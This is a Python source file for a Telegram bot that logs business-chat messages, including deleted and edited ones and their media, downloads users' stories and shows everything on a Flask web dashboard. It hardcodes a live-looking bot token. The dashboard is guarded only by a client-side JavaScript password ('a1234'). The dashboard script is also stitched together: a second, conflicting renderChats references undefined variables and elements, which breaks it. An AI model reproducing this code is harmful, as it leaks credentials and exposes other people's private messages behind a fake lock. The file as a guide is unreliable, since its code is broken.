"""
╔══════════════════════════════════════════════════════╗
║   Telegram Business Logger & Admin Bot               ║
║   + Story Downloader  + /get  + Web Dashboard        ║
║   Compatible with python-telegram-bot >= 22.x        ║
╚══════════════════════════════════════════════════════╝

Install:
    pip install "python-telegram-bot>=22.0" telethon flask

Get API_ID / API_HASH from: https://my.telegram.org
Web dashboard runs at:  http://localhost:5000
"""

import asyncio
import logging
import os
import sqlite3
import threading
from datetime import datetime, timedelta
from io import BytesIO

from flask import Flask, jsonify, render_template_string, request, send_from_directory
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    TypeHandler,
    ContextTypes,
    filters,
)
from telethon import TelegramClient
from telethon.errors import UsernameNotOccupiedError, FloodWaitError
from telethon.tl.functions.stories import GetPeerStoriesRequest
from telethon.tl.types import MessageMediaDocument

# ─────────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────────

BOT_TOKEN    = "8420281985:AAF5SwhWg5qK9c2b22Hc__v6ylmlS_kENU8"
ADMIN_ID     = 5982232938
DB_PATH      = "business_bot.db"
MEDIA_CACHE  = "media_cache"
WEB_PORT     = 5000
CACHE_TTL    = 7             # days

API_ID       = 0             # ← your integer api_id
API_HASH     = ""            # ← your api_hash string
SESSION_NAME = "story_session"

# ─────────────────────────────────────────────────────────────
#  LOGGING
# ─────────────────────────────────────────────────────────────

logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────
#  TELETHON CLIENT
# ─────────────────────────────────────────────────────────────

telethon_client: TelegramClient | None = None


async def start_telethon() -> None:
    global telethon_client
    if not API_ID or not API_HASH:
        log.warning("API_ID / API_HASH not set — /story and /get are disabled.")
        return
    telethon_client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
    await telethon_client.start()
    me = await telethon_client.get_me()
    log.info("Telethon started as: %s (@%s)", me.first_name, me.username)


# ─────────────────────────────────────────────────────────────
#  DATABASE
# ─────────────────────────────────────────────────────────────

def db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db() -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id   INTEGER PRIMARY KEY,
                username  TEXT,
                full_name TEXT,
                join_date TEXT
            );

            CREATE TABLE IF NOT EXISTS business_cache (
                message_id    INTEGER,
                chat_id       INTEGER,
                user_id       INTEGER,
                sender_name   TEXT,
                username      TEXT,
                text          TEXT,
                media_type    TEXT,
                media_path    TEXT,
                is_deleted    INTEGER DEFAULT 0,
                is_edited     INTEGER DEFAULT 0,
                original_text TEXT,
                timestamp     TEXT,
                expires_at    TEXT,
                PRIMARY KEY (message_id, chat_id)
            );
        """)
        for col_sql in [
            "ALTER TABLE business_cache ADD COLUMN user_id INTEGER",
            "ALTER TABLE business_cache ADD COLUMN media_type TEXT",
            "ALTER TABLE business_cache ADD COLUMN media_path TEXT",
            "ALTER TABLE business_cache ADD COLUMN is_deleted INTEGER DEFAULT 0",
            "ALTER TABLE business_cache ADD COLUMN is_edited INTEGER DEFAULT 0",
            "ALTER TABLE business_cache ADD COLUMN original_text TEXT",
            "ALTER TABLE business_cache ADD COLUMN expires_at TEXT",
        ]:
            try:
                conn.execute(col_sql)
            except Exception:
                pass
    log.info("Database initialised.")


def _expires_at() -> str:
    return (datetime.utcnow() + timedelta(days=CACHE_TTL)).isoformat()


def upsert_user(user_id: int, username: str | None, full_name: str) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO users (user_id, username, full_name, join_date)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                username  = excluded.username,
                full_name = excluded.full_name
            """,
            (user_id, username or "", full_name, datetime.utcnow().isoformat()),
        )


def get_all_users() -> list[tuple]:
    with sqlite3.connect(DB_PATH) as conn:
        return conn.execute("SELECT user_id FROM users").fetchall()


def count_users() -> int:
    with sqlite3.connect(DB_PATH) as conn:
        return conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]


def cache_message(
    message_id: int,
    chat_id: int,
    user_id: int | None,
    text: str,
    sender_name: str,
    username: str | None,
    media_type: str | None = None,
    media_path: str | None = None,
) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        existing = conn.execute(
            "SELECT text FROM business_cache WHERE message_id=? AND chat_id=?",
            (message_id, chat_id)
        ).fetchone()
        original = existing[0] if existing else (text or "")
        conn.execute(
            """
            INSERT OR REPLACE INTO business_cache (
                message_id, chat_id, user_id, sender_name, username,
                text, media_type, media_path,
                is_edited, original_text,
                timestamp, expires_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                message_id, chat_id, user_id, sender_name, username or "",
                text or "", media_type, media_path,
                int(existing is not None), original,
                datetime.utcnow().isoformat(), _expires_at(),
            ),
        )


def mark_deleted(message_id: int, chat_id: int) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "UPDATE business_cache SET is_deleted=1 WHERE message_id=? AND chat_id=?",
            (message_id, chat_id)
        )


def fetch_cached(message_id: int, chat_id: int) -> sqlite3.Row | None:
    with db() as conn:
        return conn.execute(
            "SELECT * FROM business_cache WHERE message_id=? AND chat_id=?",
            (message_id, chat_id),
        ).fetchone()


def count_cache() -> int:
    with sqlite3.connect(DB_PATH) as conn:
        return conn.execute("SELECT COUNT(*) FROM business_cache").fetchone()[0]


def find_cached_media(message_id: int, chat_id: int) -> str | None:
    for ext in ("jpg", "mp4", "png", "gif", "webp", "webm", "ogg", "mp3"):
        path = os.path.join(MEDIA_CACHE, f"{chat_id}_{message_id}.{ext}")
        if os.path.exists(path):
            return path
    return None


def purge_expired() -> int:
    now = datetime.utcnow().isoformat()
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute(
            "DELETE FROM business_cache WHERE expires_at IS NOT NULL AND expires_at <= ?",
            (now,)
        )
        return cur.rowcount


async def purge_loop() -> None:
    while True:
        await asyncio.sleep(30)
        n = purge_expired()
        if n:
            log.info("Purged %d expired messages from cache.", n)
        await asyncio.sleep(86370)


# ─────────────────────────────────────────────────────────────
#  WEB DASHBOARD
# ─────────────────────────────────────────────────────────────

flask_app = Flask(__name__)

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>TG Business Logger v2.0.1</title>
<style>
:root{
  --bg:#0d0f1a;--surf:#141726;--card:#1c2035;--border:#252a45;
  --accent:#5b8dee;--accent2:#7c5cfc;--green:#3ecf8e;--red:#f66;
  --yellow:#f5a623;--text:#e2e8f0;--muted:#6b7280;--dim:#9ca3af;
  --del-bg:#2a1414;--edit-bg:#1a2330;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;height:100vh;display:flex;flex-direction:column;overflow:hidden}

/* ── password overlay ── */
#password-overlay{position:fixed;inset:0;background:rgba(13,15,26,.98);backdrop-filter:blur(10px);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px}
#password-overlay.hidden{display:none}
.pwd-box{background:var(--surf);border:1px solid var(--border);border-radius:12px;padding:30px 40px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.4)}
.pwd-box h2{font-size:1.4rem;margin-bottom:8px;color:var(--accent)}
.pwd-box p{color:var(--muted);font-size:.85rem;margin-bottom:20px}
.pwd-input{background:var(--card);border:2px solid var(--border);color:var(--text);border-radius:8px;padding:10px 16px;font-size:1rem;width:280px;outline:none;text-align:center}
.pwd-input:focus{border-color:var(--accent)}
.pwd-btn{background:var(--accent);border:none;color:#fff;border-radius:8px;padding:10px 24px;font-size:.95rem;cursor:pointer;margin-top:12px;font-weight:600}
.pwd-btn:hover{background:#4a7ad8}
.pwd-error{color:var(--red);font-size:.8rem;margin-top:8px;min-height:20px}
.blur-content{filter:blur(8px);pointer-events:none}

/* ── header ── */
header{background:var(--surf);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;z-index:10}
header h1{font-size:1rem;font-weight:700;letter-spacing:.3px}
header h1 span{color:var(--accent)}
.hright{display:flex;align-items:center;gap:16px;font-size:.78rem;color:var(--muted)}
.live{display:flex;align-items:center;gap:5px}
.dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

/* ── global stats bar ── */
.gstats{display:flex;gap:8px;padding:8px 20px;background:var(--surf);border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap}
.gstat{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:5px 12px;font-size:.75rem;display:flex;gap:6px;align-items:center}
.gstat .sv{font-weight:700;color:var(--accent)}
.gstat.red .sv{color:var(--red)}
.gstat.yellow .sv{color:var(--yellow)}
.gstat.green .sv{color:var(--green)}

/* ── main container ── */
.main-container{flex:1;overflow:hidden;display:flex;flex-direction:column}

/* ── view modes ── */
.view{display:none;flex:1;overflow:hidden}
.view.active{display:flex;flex-direction:column}

/* ── back button ── */
.back-btn{position:absolute;top:10px;left:14px;background:var(--card);border:1px solid var(--border);color:var(--accent);border-radius:8px;padding:6px 14px;font-size:.8rem;cursor:pointer;display:flex;align-items:center;gap:6px;z-index:5}
.back-btn:hover{background:var(--surf)}

/* ── grid view (accounts & chats) ── */
.grid-view{padding:20px;overflow-y:auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;align-content:start}
.grid-view::-webkit-scrollbar{width:6px}
.grid-view::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

.grid-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px;cursor:pointer;transition:.2s;position:relative}
.grid-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 4px 12px rgba(91,141,238,.15)}
.grid-card-header{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.grid-avatar{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-weight:700;font-size:1.1rem;flex-shrink:0}
.grid-card-title{font-size:1rem;font-weight:600;color:var(--text);word-break:break-word}
.grid-card-sub{font-size:.78rem;color:var(--muted);margin-bottom:8px}
.grid-stats{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
.grid-badge{font-size:.7rem;background:var(--surf);border:1px solid var(--border);border-radius:6px;padding:3px 8px;color:var(--dim)}
.grid-badge.red{background:#3a1414;border-color:#5a2020;color:var(--red)}
.grid-badge.yellow{background:#2a2010;border-color:#4a3010;color:var(--yellow)}
.grid-badge.green{background:#1a3020;border-color:#2a5020;color:var(--green)}

/* ── empty states ── */
.empty{text-align:center;padding:40px 16px;color:var(--muted);font-size:.83rem}
.empty-icon{font-size:2rem;margin-bottom:8px}

/* ── messages view ── */
.msg-view{display:flex;flex-direction:column;flex:1;overflow:hidden}
.msg-header{padding:14px 20px;background:var(--surf);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;position:relative}
.msg-header-title{font-size:1rem;font-weight:600}
.msg-header-sub{font-size:.78rem;color:var(--muted)}
.msg-search{background:var(--card);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:6px 12px;font-size:.8rem;width:280px;outline:none;margin-left:auto}
.msg-search:focus{border-color:var(--accent)}
.msg-list-wrap{flex:1;overflow-y:auto;padding:16px}
.msg-list-wrap::-webkit-scrollbar{width:6px}
.msg-list-wrap::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
.msg-wrap{display:flex;gap:6px;align-items:flex-start;margin-bottom:10px}
.msg-wrap input[type=checkbox]{margin-top:5px;flex-shrink:0;accent-color:var(--accent);width:14px;height:14px;cursor:pointer;display:none}
.msg{flex:1;border-radius:10px;padding:12px 14px;border-left:3px solid var(--border);min-width:0;max-width:700px}
.msg.normal{background:var(--card);border-left-color:var(--accent)}
.msg.deleted{background:var(--del-bg);border-left-color:var(--red)}
.msg.edited{background:var(--edit-bg);border-left-color:var(--yellow)}
.msg.media-only{border-left-color:var(--green)}
.msg-meta{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:6px}
.msender{font-weight:600;color:var(--accent);font-size:.82rem}
.muname{color:var(--muted);font-size:.76rem}
.muid{color:var(--muted);font-size:.72rem;background:var(--border);border-radius:3px;padding:1px 5px}
.mts{color:var(--muted);font-size:.72rem;margin-left:auto}
.badge{font-size:.62rem;font-weight:700;padding:1px 6px;border-radius:10px;text-transform:uppercase}
.badge.del{background:#5c1414;color:#ff8080}
.badge.edit{background:#1a3020;color:#6ddb9a}
.badge.med{background:#1a2a3a;color:var(--accent)}
.msg-text{font-size:.88rem;line-height:1.6;word-break:break-word;color:var(--text)}
.msg-text.dim{color:var(--muted);font-style:italic}
.original{font-size:.76rem;color:var(--muted);margin-top:4px;padding-top:6px;border-top:1px solid var(--border)}
.original b{color:#9ca3af}
.expires{font-size:.68rem;color:var(--muted);margin-top:4px}
.expires.soon{color:var(--yellow)}

/* ── media ── */
.media-wrap{margin-top:7px}
.media-wrap img{max-width:260px;max-height:260px;border-radius:8px;cursor:pointer;display:block}
.media-wrap video{max-width:260px;max-height:260px;border-radius:8px;display:block}
.media-wrap audio{width:100%;max-width:300px;height:36px;margin-top:2px}
.sticker-img{max-width:120px;max-height:120px}

/* ── lightbox ── */
#lightbox{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:1000;align-items:center;justify-content:center;flex-direction:column;gap:12px}
#lightbox.open{display:flex}
#lightbox img,#lightbox video{max-width:90vw;max-height:85vh;border-radius:8px}
#lightbox-close{position:absolute;top:16px;right:20px;font-size:1.6rem;cursor:pointer;color:var(--dim)}
</style>
</head>
<body>

<!-- Password Overlay -->
<div id="password-overlay">
  <div class="pwd-box">
    <h2>🔐 Dashboard Access</h2>
    <p>Enter password to continue</p>
    <input type="password" class="pwd-input" id="pwd-input" placeholder="Password" onkeypress="if(event.key==='Enter')checkPassword()">
    <button class="pwd-btn" onclick="checkPassword()">Unlock</button>
    <div class="pwd-error" id="pwd-error"></div>
  </div>
</div>

<div id="main-content" class="blur-content">

<header>
  <h1>📡 <span>Telegram</span> Business Logger</h1>
  <div class="hright">
    <div class="live"><div class="dot"></div> Live</div>
    <span>Updated: <span id="ts">—</span></span>
    <span>TTL: 7 days</span>
  </div>
</header>

<div class="gstats">
  <div class="gstat">Accounts <span class="sv" id="gs-accounts">—</span></div>
  <div class="gstat">Messages <span class="sv" id="gs-msgs">—</span></div>
  <div class="gstat">Chats <span class="sv" id="gs-chats">—</span></div>
  <div class="gstat red">Deleted <span class="sv" id="gs-del">—</span></div>
  <div class="gstat yellow">Edited <span class="sv" id="gs-edit">—</span></div>
  <div class="gstat green">Media files <span class="sv" id="gs-media">—</span></div>
</div>

<div class="main-container">
  <!-- View 1: Accounts -->
  <div class="view active" id="view-accounts">
    <div class="grid-view" id="accounts-grid">
      <div class="empty"><div class="empty-icon">💬</div>Loading accounts…</div>
    </div>
  </div>

  <!-- View 2: Chats -->
  <div class="view" id="view-chats">
    <button class="back-btn" onclick="showView('accounts')">← Back</button>
    <div class="grid-view" id="chats-grid" style="padding-top:50px">
      <div class="empty"><div class="empty-icon">💬</div>Loading chats…</div>
    </div>
  </div>

  <!-- View 3: Messages -->
  <div class="view" id="view-messages">
    <div class="msg-view">
      <div class="msg-header">
        <button class="back-btn" onclick="showView('chats')" style="position:static">← Back</button>
        <div style="flex:1">
          <div class="msg-header-title" id="msg-title">Chat</div>
          <div class="msg-header-sub" id="msg-sub">—</div>
        </div>
        <input class="msg-search" id="msg-search" placeholder="Search messages…" oninput="renderMessages()">
      </div>
      <div class="msg-list-wrap" id="messages-list">
        <div class="empty"><div class="empty-icon">💬</div>Loading messages…</div>
      </div>
    </div>
  </div>
</div>

</div>

<!-- Lightbox -->
<div id="lightbox" onclick="closeLightbox()">
  <span id="lightbox-close">✕</span>
  <div id="lightbox-content"></div>
</div>

<script>
// ── Password Protection ──────────────────────────────────
const CORRECT_PASSWORD = 'a1234';
let isUnlocked = false;

function checkPassword() {
  const input = document.getElementById('pwd-input');
  const error = document.getElementById('pwd-error');
  if (input.value === CORRECT_PASSWORD) {
    isUnlocked = true;
    document.getElementById('password-overlay').classList.add('hidden');
    document.getElementById('main-content').classList.remove('blur-content');
    fetchData();
    setInterval(fetchData, 5000);
  } else {
    error.textContent = '❌ Incorrect password';
    input.value = '';
    input.focus();
  }
}

// Focus password input on load
window.addEventListener('load', () => {
  document.getElementById('pwd-input').focus();
});

// ── State ─────────────────────────────────────────────────
let allData         = { accounts:[], stats:{} };
let selectedAccountId = null;
let selectedChatId    = null;
let currentView       = 'accounts';

// ── Helpers ───────────────────────────────────────────────
const esc = s => (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

function initials(name) {
  return (name||'?').split(' ').slice(0,2).map(w=>w[0]||'').join('').toUpperCase() || '?';
}

function timeAgo(iso) {
  const s = Math.floor((Date.now() - new Date(iso+'Z')) / 1000);
  if (s < 60)   return s+'s ago';
  if (s < 3600) return Math.floor(s/60)+'m ago';
  if (s < 86400)return Math.floor(s/3600)+'h ago';
  return Math.floor(s/86400)+'d ago';
}

function daysLeft(iso) {
  return (new Date(iso+'Z') - Date.now()) / 86400000;
}

// ── View Navigation ───────────────────────────────────────
function showView(view) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  if (view === 'accounts') {
    document.getElementById('view-accounts').classList.add('active');
    selectedAccountId = null;
    selectedChatId = null;
    currentView = 'accounts';
    renderAccounts();
  } else if (view === 'chats') {
    document.getElementById('view-chats').classList.add('active');
    selectedChatId = null;
    currentView = 'chats';
    renderChats();
  } else if (view === 'messages') {
    document.getElementById('view-messages').classList.add('active');
    currentView = 'messages';
    renderMessages();
  }
}

// ── Render Accounts ───────────────────────────────────────
function renderAccounts() {
  const grid = document.getElementById('accounts-grid');
  const accounts = allData.accounts || [];
  
  console.log('Rendering accounts:', accounts); // Debug log
  
  if (!accounts.length) {
    grid.innerHTML = '<div class="empty"><div class="empty-icon">📭</div>No accounts found</div>';
    return;
  }

  grid.innerHTML = accounts.map(acc => {
    const av = initials(acc.name || `Account ${acc.account_id}`);
    const delBadge = acc.deleted_count > 0 ? `<span class="grid-badge red">🗑 ${acc.deleted_count} deleted</span>` : '';
    const editBadge = acc.edited_count > 0 ? `<span class="grid-badge yellow">✏ ${acc.edited_count} edited</span>` : '';
    const mediaBadge = acc.media_count > 0 ? `<span class="grid-badge green">📎 ${acc.media_count} media</span>` : '';
    
    return `
      <div class="grid-card" onclick="selectAccount(${acc.account_id})">
        <div class="grid-card-header">
          <div class="grid-avatar">${av}</div>
          <div style="flex:1;min-width:0">
            <div class="grid-card-title">${esc(acc.name || `Account ${acc.account_id}`)}</div>
            <div class="grid-card-sub">ID: ${acc.account_id}</div>
          </div>
        </div>
        <div class="grid-stats">
          <span class="grid-badge">${acc.msg_count} messages</span>
          <span class="grid-badge">${acc.chat_count} chats</span>
          ${delBadge}
          ${editBadge}
          ${mediaBadge}
        </div>
      </div>`;
  }).join('');
}

function selectAccount(accountId) {
  console.log('Selected account:', accountId); // Debug log
  selectedAccountId = accountId;
  showView('chats');
}

// ── Render Chats ──────────────────────────────────────────
function renderChats() {
  const grid = document.getElementById('chats-grid');
  
  console.log('renderChats called - selectedAccountId:', selectedAccountId); // Debug
  console.log('renderChats called - allData:', allData); // Debug
  
  if (!selectedAccountId) {
    grid.innerHTML = '<div class="empty"><div class="empty-icon">←</div>Select an account</div>';
    return;
  }

  const account = (allData.accounts||[]).find(a => a.account_id === selectedAccountId);
  console.log('Rendering chats for account:', selectedAccountId, account); // Debug log
  
  if (!account) {
    console.error('Account not found! selectedAccountId:', selectedAccountId, 'Available accounts:', allData.accounts);
    grid.innerHTML = '<div class="empty">Account not found. ID: ' + selectedAccountId + '</div>';
    return;
  }

  const chats = account.chats || [];
  console.log('Chats:', chats); // Debug log
  
  if (!chats.length) {
    grid.innerHTML = '<div class="empty"><div class="empty-icon">💬</div>No chats in this account</div>';
    return;
  }

  grid.innerHTML = chats.map(chat => {
    const delBadge = chat.deleted_count > 0 ? `<span class="grid-badge red">🗑 ${chat.deleted_count}</span>` : '';
    const editBadge = chat.edited_count > 0 ? `<span class="grid-badge yellow">✏ ${chat.edited_count}</span>` : '';
    const lastText = chat.last_text && chat.last_text !== '[non-text content]'
      ? (chat.last_text.length > 50 ? chat.last_text.slice(0,50)+'…' : chat.last_text)
      : (chat.last_media_type ? `[${chat.last_media_type}]` : '[no content]');
    
    const chatUsername = chat.chat_username ? `@${esc(chat.chat_username)}` : '';
    const chatSubtitle = chatUsername ? `${chatUsername} · ID: ${chat.chat_id}` : `ID: ${chat.chat_id}`;
    
    return `
      <div class="grid-card" onclick="selectChat(${chat.chat_id})">
        <div class="grid-card-header">
          <div class="grid-avatar" style="background:linear-gradient(135deg,#3ecf8e,#1a7a5a)">💬</div>
          <div style="flex:1;min-width:0">
            <div class="grid-card-title">${esc(chat.chat_name || `Chat ${chat.chat_id}`)}</div>
            <div class="grid-card-sub">${chatSubtitle}</div>
          </div>
        </div>
        <div class="grid-card-sub" style="margin-top:8px">${esc(lastText)}</div>
        <div class="grid-card-sub">${timeAgo(chat.last_ts)}</div>
        <div class="grid-stats">
          <span class="grid-badge">${chat.msg_count} messages</span>
          ${delBadge}
          ${editBadge}
        </div>
      </div>`;
  }).join('');
}

function selectChat(chatId) {
  console.log('Selected chat:', chatId); // Debug log
  selectedChatId = chatId;
  showView('messages');
}

// ── Media rendering ───────────────────────────────────────
function mediaHtml(m) {
  if (!m.media_type || !m.media_path) return '';
  const fname  = m.media_path.split(/[\\/]/).pop();
  const url    = '/media/' + encodeURIComponent(fname);
  const mt     = m.media_type;

  if (mt === 'photo') {
    return `<div class="media-wrap"><img src="${url}" loading="lazy" onclick="openLightbox('img','${url}')" title="Click to enlarge"></div>`;
  }
  if (mt === 'video' || mt === 'animation') {
    return `<div class="media-wrap"><video src="${url}" controls ${mt==='animation'?'autoplay loop muted':''}></video></div>`;
  }
  if (mt === 'voice' || mt === 'audio') {
    return `<div class="media-wrap"><audio src="${url}" controls></audio></div>`;
  }
  if (mt === 'sticker') {
    // webp = static sticker, webm = animated sticker
    if (fname.endsWith('.webm')) {
      return `<div class="media-wrap"><video src="${url}" autoplay loop muted class="sticker-img"></video></div>`;
    }
    return `<div class="media-wrap"><img src="${url}" class="sticker-img" loading="lazy"></div>`;
  }
  return `<div class="media-wrap"><a href="${url}" target="_blank" style="color:var(--accent);font-size:.8rem">📎 Open ${mt}</a></div>`;
}

// ── Lightbox ──────────────────────────────────────────────
function openLightbox(type, url) {
  const lb = document.getElementById('lightbox');
  const lc = document.getElementById('lightbox-content');
  lc.innerHTML = type === 'img'
    ? `<img src="${url}">`
    : `<video src="${url}" controls autoplay style="max-width:90vw;max-height:85vh;border-radius:8px">`;
  lb.classList.add('open');
  event.stopPropagation();
}
function closeLightbox() {
  document.getElementById('lightbox').classList.remove('open');
  document.getElementById('lightbox-content').innerHTML = '';
}
document.addEventListener('keydown', e => { if(e.key==='Escape') closeLightbox(); });

// ── Selection ─────────────────────────────────────────────
function toggleSel(set, key, btn_id) {
  if (set.has(key)) set.delete(key); else set.add(key);
  updateDelBtn(btn_id, set);
}
function updateDelBtn(id, set) {
  const btn = document.getElementById(id);
  if (!btn) return;
  if (set.size > 0) { btn.classList.add('show'); btn.textContent = `🗑 Delete (${set.size})`; }
  else              { btn.classList.remove('show'); btn.textContent = '🗑 Delete'; }
}

// ── Filter cycle ──────────────────────────────────────────
const filters = ['all','deleted','edited','media'];
const filterLabels = {'all':'All','deleted':'Deleted','edited':'Edited','media':'Media'};
function cycleFilter() {
  msgFilter = filters[(filters.indexOf(msgFilter)+1)%filters.length];
  document.getElementById('filter-btn').textContent = 'Filter: '+filterLabels[msgFilter];
  renderMessages();
}

// ── Render Users ──────────────────────────────────────────
function renderUsers() {
  const q    = document.getElementById('s-users').value.toLowerCase();
  const wrap = document.getElementById('list-users');
  let contacts = allData.contacts || [];
  if (q) contacts = contacts.filter(c =>
    (c.name+c.username+String(c.user_id)).toLowerCase().includes(q)
  );
  if (!contacts.length) {
    wrap.innerHTML = '<div class="empty"><div class="empty-icon">🔍</div>No contacts found</div>';
    return;
  }
  wrap.innerHTML = contacts.map(c => {
    const av  = initials(c.name);
    const sel = selUsers.has(c.user_id) ? 'checked' : '';
    const act = selectedUserId === c.user_id ? 'active' : '';
    const del = c.deleted_count > 0 ? `<span class="item-badge red">🗑 ${c.deleted_count}</span>` : '';
    const sub = (c.username ? '@'+c.username+' · ' : '') + c.msg_count + ' msg' + (c.msg_count!==1?'s':'');
    return `
      <div class="item ${act}" data-uid="${c.user_id}">
        <input type="checkbox" ${sel} onclick="event.stopPropagation();toggleSel(selUsers,${c.user_id},'del-users-btn');restoreChecks()">
        <div class="avatar">${av}</div>
        <div class="item-body">
          <div class="item-name">${esc(c.name)}</div>
          <div class="item-sub">${esc(sub)}</div>
        </div>
        ${del}
        <span class="item-badge">${c.msg_count}</span>
      </div>`;
  }).join('');

  wrap.querySelectorAll('.item').forEach(el => {
    el.addEventListener('click', () => {
      selectedUserId = parseInt(el.dataset.uid);
      selectedChatId = null;
      selChats.clear(); selMsgs.clear();
      updateDelBtn('del-chats-btn', selChats);
      updateDelBtn('del-msgs-btn', selMsgs);
      renderUsers();
      renderChats();
      document.getElementById('list-msgs').innerHTML =
        '<div class="empty"><div class="empty-icon">←</div>Select a chat</div>';
    });
  });
}

// ── Render Chats ──────────────────────────────────────────
function renderChats() {
  const wrap = document.getElementById('list-chats');
  if (!selectedUserId) {
    wrap.innerHTML = '<div class="empty"><div class="empty-icon">←</div>Select a contact</div>';
    return;
  }
  const contact = (allData.contacts||[]).find(c => c.user_id === selectedUserId);
  if (!contact) { wrap.innerHTML = '<div class="empty">No data</div>'; return; }

  const q     = document.getElementById('s-chats').value.toLowerCase();
  let chats = contact.chats || [];
  if (q) chats = chats.filter(ch => String(ch.chat_id).includes(q) || (ch.last_text||'').toLowerCase().includes(q));

  if (!chats.length) {
    wrap.innerHTML = '<div class="empty"><div class="empty-icon">💬</div>No chats found</div>';
    return;
  }
  wrap.innerHTML = chats.map(ch => {
    const sel = selChats.has(ch.chat_id) ? 'checked' : '';
    const act = selectedChatId === ch.chat_id ? 'active' : '';
    const delBadge = ch.deleted_count > 0 ? `<span class="item-badge red">🗑${ch.deleted_count}</span>` : '';
    const editBadge= ch.edited_count > 0  ? `<span class="item-badge yellow">✏${ch.edited_count}</span>` : '';
    const last = ch.last_text
      ? (ch.last_text.length > 32 ? ch.last_text.slice(0,32)+'…' : ch.last_text)
      : (ch.last_media_type ? '['+ch.last_media_type+']' : '');
    return `
      <div class="item ${act}" data-cid="${ch.chat_id}">
        <input type="checkbox" ${sel} onclick="event.stopPropagation();toggleSel(selChats,${ch.chat_id},'del-chats-btn');restoreChecks()">
        <div class="avatar" style="background:linear-gradient(135deg,#3ecf8e,#1a7a5a)">💬</div>
        <div class="item-body">
          <div class="item-name">Chat ${ch.chat_id}</div>
          <div class="item-sub">${esc(last)} · ${timeAgo(ch.last_ts)}</div>
        </div>
        ${delBadge}${editBadge}
        <span class="item-badge">${ch.msg_count}</span>
      </div>`;
  }).join('');

  wrap.querySelectorAll('.item').forEach(el => {
    el.addEventListener('click', () => {
      selectedChatId = parseInt(el.dataset.cid);
      selMsgs.clear();
      updateDelBtn('del-msgs-btn', selMsgs);
      renderChats();
      renderMessages();
    });
  });
}

// ── Render Messages ───────────────────────────────────────
function renderMessages() {
  const wrap = document.getElementById('messages-list');
  if (!selectedChatId || !selectedAccountId) {
    wrap.innerHTML = '<div class="empty"><div class="empty-icon">←</div>Select a chat</div>';
    return;
  }

  const account = (allData.accounts||[]).find(a => a.account_id === selectedAccountId);
  if (!account) return;
  
  const chat = (account.chats||[]).find(c => c.chat_id === selectedChatId);
  if (!chat) return;

  // Update header
  document.getElementById('msg-title').textContent = chat.chat_name || `Chat ${chat.chat_id}`;
  document.getElementById('msg-sub').textContent = `ID: ${chat.chat_id} · ${chat.msg_count} messages`;

  let msgs = chat.messages || [];
  const q = document.getElementById('msg-search').value.toLowerCase();
  
  if (q) msgs = msgs.filter(m =>
    (m.text+m.original_text+m.sender_name+m.username).toLowerCase().includes(q)
  );

  if (!msgs.length) {
    wrap.innerHTML = '<div class="empty"><div class="empty-icon">🔍</div>No messages found</div>';
    return;
  }

  wrap.innerHTML = msgs.map(m => {
    const cls     = m.is_deleted ? 'deleted' : m.is_edited ? 'edited' : m.media_type ? 'media-only' : 'normal';
    const badge   = m.is_deleted
      ? '<span class="badge del">Deleted</span>'
      : m.is_edited
        ? '<span class="badge edit">Edited</span>'
        : m.media_type
          ? `<span class="badge med">${esc(m.media_type)}</span>`
          : '';
    const textPart = (m.text && m.text !== '[non-text content]')
      ? `<div class="msg-text">${esc(m.text)}</div>`
      : m.media_type
        ? ''
        : `<div class="msg-text dim">[no text]</div>`;
    const origPart = (m.is_edited && m.original_text && m.original_text !== m.text)
      ? `<div class="original"><b>Original:</b> ${esc(m.original_text)}</div>`
      : '';
    const dl   = daysLeft(m.expires_at);
    const ecls = dl <= 1 ? 'expires soon' : 'expires';
